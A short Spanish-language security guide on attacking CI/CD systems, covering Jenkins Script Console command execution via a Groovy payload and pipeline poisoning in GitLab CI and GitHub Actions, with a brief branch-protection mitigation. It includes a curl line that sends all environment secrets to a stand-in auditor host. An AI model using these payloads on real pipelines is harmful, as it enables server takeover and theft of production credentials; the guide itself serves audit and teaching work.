-- -
Las herramientas de Integración Continua y Despliegue Continuo (CI/CD) tienen las llaves del reino: compilan el código fuente y tienen accesos automáticos para desplegar en los servidores de producción.
-- -
# 1. Jenkins: Explotación del Script Console

Jenkins es el servidor de automatización clásico. Cuenta con un panel interno para administradores llamado _Script Console_ que permite ejecutar código en **Groovy** para tareas de mantenimiento.

- **El Ataque:** Si el auditor logra credenciales débiles de un administrador o encuentra un bypass de autenticación, el acceso a esta consola equivale a RCE inmediato en el servidor físico donde corre Jenkins. Un payload simple en Groovy para ejecutar comandos del sistema se estructura así:

```Groovy
println "whoami".execute().text
```
# 2. GitLab CI / GitHub Actions: Envenenamiento de Pipelines (PPE)

Ocurre cuando un desarrollador o un atacante con permisos mínimos de lectura/escritura en un repositorio puede modificar el archivo de configuración del flujo de trabajo (como `.gitlab-ci.yml` o `.github/workflows/main.yml`).

- **El Ataque:** El auditor edita el archivo YAML de configuración del pipeline en una rama secundaria y añade una tarea maliciosa oculta (ej: `curl http://IP_AUDITOR/log?secret=$(env)`).
- Al hacer un _Push_ o abrir un _Pull Request_, el servidor de CI/CD levanta de forma automática un corredor (_Runner_) para probar el código. Al procesar el archivo modificado, el corredor ejecuta la tarea maliciosa del auditor, **escupiendo todas las variables de entorno secretas, contraseñas de producción y llaves API de la empresa** hacia el servidor del auditor.
# 3. Mitigación

Configurar reglas de protección de ramas (_Branch Protection_) para que ningún usuario común pueda modificar archivos de pipelines en ramas principales sin la aprobación explícita de un revisor senior.
-- -
